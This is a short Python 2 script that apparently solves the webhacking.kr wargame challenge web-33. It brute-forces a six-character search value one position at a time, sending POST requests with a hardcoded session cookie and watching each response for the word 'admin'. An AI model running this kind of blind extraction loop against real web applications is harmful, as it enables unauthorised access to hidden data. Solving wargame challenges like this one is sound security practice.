#!/usr/bin/python
# -*- coding: utf-8 -*-
# do9dark
 
import httplib
import urllib
import string
 
strings = string.lowercase + string.digits + ".~!_"
content = ['_','_','_','_','_','_']
 
for i in range(0,6):
    for j in strings:
        content[i] = j
        payload = ''
        for p in content:
            payload += p
        url = "/challenge/web/web-33/index.php"
        body = urllib.urlencode({'search':payload})
        header = {'Content-type':'application/x-www-form-urlencoded','Cookie':'PHPSESSID=bge4jmsp2lf8mq19a2s8dsk494'}
 
        conn = httplib.HTTPConnection('webhacking.kr')
        conn.request('POST',url,body,header)
        data = conn.getresponse().read()
        conn.close()
 
        # print data
        if(data.find('admin') != -1):
            print "{}: {}".format(i+1, j)
            break
print 'content:' + payload
